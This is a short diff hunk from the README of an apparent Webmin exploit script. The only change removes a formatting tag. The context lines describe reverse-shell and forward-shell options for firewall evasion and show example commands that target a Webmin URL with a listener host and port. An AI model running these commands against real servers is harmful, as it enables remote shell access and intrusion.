@@ -15,7 +15,6 @@ creates a reverse shell or a pseudo interactive shell using mkfifo for firewall 
 ```
 python3 webmin.py -t https://webmin.site/ -lhost 127.0.0.1 -lport 9001
 ```
-<br>
 * For forward shell firewall evasion
 ```
 python3 webmin.py -t https://webmin.site/ -fs
